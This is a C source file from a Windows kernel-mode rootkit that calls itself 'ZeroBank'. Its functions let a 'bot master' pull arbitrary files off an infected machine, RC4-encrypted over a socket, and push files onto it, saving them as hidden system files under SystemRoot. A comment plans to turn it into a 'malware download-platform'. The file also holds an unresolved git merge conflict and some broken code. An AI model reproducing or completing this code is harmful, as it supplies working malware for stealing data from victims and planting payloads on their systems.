#include "common.h"

/*///////////////////////////////////////////////////////////////
//
//	File: transfer.c
//
//	Implementation of file transfering routines
//
//	Function: rk_send_file_to_userspace
//		- Bot master can download file from remote host
//		- If file is being by another process it cannot be
//		downloaded
//	Function: rk_store_file_from_userspace
//		- Bot master can store files inside directory
//		
//		To do:
//		- Store files in encrypted format, serving
//		the purpose of a malware download-platform
//
*////////////////////////////////////////////////////////////////


NTSTATUS rk_send_file_to_userspace(IN PCHAR FileName, IN PFILE_OBJECT SocketObject, IN PROOTKIT_API_HASH Hash)
{

	OBJECT_ATTRIBUTES oa = { 0 };
	UNICODE_STRING ustr1 = { 0 };
	IO_STATUS_BLOCK io = { 0 };
	HANDLE handle = NULL;
	NTSTATUS st;
	ANSI_STRING ansi = { 0 };
	FILE_STANDARD_INFORMATION fileinfo = { 0 };
	PVOID Buffer = NULL;
	CHAR cSize[260] = { 0 };
	INT sendsize = 0;
	PFILE_OBJECT FileObject = NULL;

	Hash->_RtlInitAnsiString(&ansi, FileName);
	Hash->_RtlAnsiStringToUnicodeString(&ustr1, &ansi, TRUE);
	InitializeObjectAttributes(&oa, &ustr1, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

#ifndef _WIN64 && WINVER == _WIN32_WINNT_WIN7

	st = MyIopCreateFile(&handle, \
		FILE_GENERIC_READ, \
		&oa, \
		&io, \
		0, \
		FILE_ATTRIBUTE_NORMAL, \
		FILE_SHARE_READ, \
		FILE_OPEN, \
		FILE_NON_DIRECTORY_FILE |
		FILE_SYNCHRONOUS_IO_NONALERT, \
		NULL, \
		0, \
		CreateFileTypeNone, \
		0, \
		IO_NO_PARAMETER_CHECKING, \
		0, \
		NULL);
#else
	st = IoCreateFileEx(&handle, FILE_GENERIC_READ, &oa, &io, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_NON_DIRECTORY_FILE |
		FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0, CreateFileTypeNone, NULL, IO_NO_PARAMETER_CHECKING, NULL);
#endif
	if (NT_SUCCESS(st))
	{

		st = IopQueryFileInformation(handle, &fileinfo, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
		if (NT_SUCCESS(st))
		{

			Buffer = Hash->_ExAllocatePoolWithTag(NonPagedPool, fileinfo.EndOfFile.QuadPart, 'MeM');
			if (Buffer)
			{

				st = IopReadFile(handle, &io, Buffer, fileinfo.EndOfFile.QuadPart, NULL);
				if (NT_SUCCESS(st))
				{
					Hash->_sprintf_s(cSize, 260, "%lu", fileinfo.EndOfFile.QuadPart);

					sendsize = send(SocketObject, cSize, 260);
					if (sendsize > 0)
					{
						KdPrint(("\r\nFile Size successfully sent to user-space"));

						sendsize = tdi_send_crypted(SocketObject, RC4_KEY_3, (PVOID)Buffer, (ULONG)fileinfo.EndOfFile.QuadPart, 0);
						if (sendsize > 0)
						{
							KdPrint(("\r\nFile Buffer successfully sent to user-space"));
						}
					}
				}
				Hash->_ExFreePoolWithTag(Buffer, 'MeM');
			}
		}
#ifndef _WIN64

		ObpCloseHandle(handle, KernelMode);
#else
		ZwClose(handle);
#endif
	}

	Hash->_RtlFreeUnicodeString(&ustr1);

	return st;
}



NTSTATUS rk_store_file_from_userspace(IN PFILE_OBJECT SocketObject, IN PROOTKIT_API_HASH Hash)
{
	NTSTATUS st;
	OBJECT_ATTRIBUTES oa = { 0 };
	UNICODE_STRING ustr1 = { 0 };
	IO_STATUS_BLOCK io = { 0 };
	HANDLE handle;
	INT recvsize = 0;
	ULONG filesize = 0;
	PCHAR Buffer = NULL;
	INT offset = 0;
	INT size = 0;
	PROOTKIT_STORE_USERSPACE_FILE storefile = NULL;
	ANSI_STRING ansi = { 0 };
	LARGE_INTEGER large = { 0 };
	CHAR szPrefix[255] = { 0 };

	storefile = (PROOTKIT_STORE_USERSPACE_FILE)Hash->_ExAllocatePool(NonPagedPool, sizeof(ROOTKIT_STORE_USERSPACE_FILE));
	if (storefile == NULL)
		return STATUS_INSUFFICIENT_RESOURCES;

	recvsize = recv(SocketObject, (char*)storefile, sizeof(ROOTKIT_STORE_USERSPACE_FILE));
	if (recvsize <= 0)
		return STATUS_UNSUCCESSFUL;


	Buffer = (char*)Hash->_ExAllocatePool(NonPagedPool, (SIZE_T)storefile->FileSize);
	if (Buffer == NULL)
		return STATUS_NO_MEMORY;

	while (storefile->FileSize > offset)
	{
		size = recv(SocketObject, Buffer + offset, storefile->FileSize - offset);
		if (size <= 0)
			break;
		else
			offset += size;
	}

	/*
		NEEDS TO BE IMPLEMENTED PROPERLY

	*/

	kistrcpy(szPrefix,"\\SystemRoot\\{ZeroBank GUID Directory}\\@");
	kistrcat(szPrefix,"\\");
	kistrcat(szPrefix,storefile->FileName);
	Hash->_RtlInitAnsiString(&ansi, szPrefix);
	Hash->_RtlAnsiStringToUnicodeString(&ustr1, &ansi, TRUE);
	InitializeObjectAttributes(&oa, &ustr1, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

	large.QuadPart = 1024;

#ifndef _WIN64 && WINVER == _WIN32_WINNT_WIN7

	st = MyIopCreateFile(&handle, FILE_GENERIC_WRITE, &oa, &io, &large, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, FILE_SHARE_WRITE,
		FILE_CREATE, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0,
		CreateFileTypeNone, NULL, 0, IO_NO_PARAMETER_CHECKING, NULL);

	if (!NT_SUCCESS(st))
	{
		ObpCloseHandle(handle, KernelMode);
		return STATUS_UNSUCCESSFUL;
	}

#else

	st = IoCreateFileEx(Handle, FILE_GENERIC_WRITE, &oa, &io, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_CREATE,
		FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0, CreateFileTypeNone, NULL, IO_NO_PARAMETER_CHECKING, 0, NULL);
	if (!NT_SUCCESS(st))
	{
		ZwClose(handle);
		return STATUS_UNSUCCESSFUL;
	}


#endif

	/*
		
		Encrypt file Before writing
	
	*/


<<<<<<< HEAD
	st = IopWriteFile(handle, &io, (PVOID)Buffer, storefile->FileSize, NULL);
=======
	st = IopWriteFile(handle,FILE_GENERIC_WRITE, &io, (PVOID)Buffer, storefile->FileSize, NULL);
>>>>>>> adding files
	if (!NT_SUCCESS(st))
		return STATUS_UNSUCCESSFUL;


#ifndef _WIN64
	ObpCloseHandle(handle, KernelMode);
#else
	ZwClose(handle);
#endif

	Hash->_RtlFreeUnicodeString(&ustr1);
	Hash->_ExFreePoolWithTag(storefile,0);
	Hash->_ExFreePoolWithTag(Buffer,0);

	return st;
}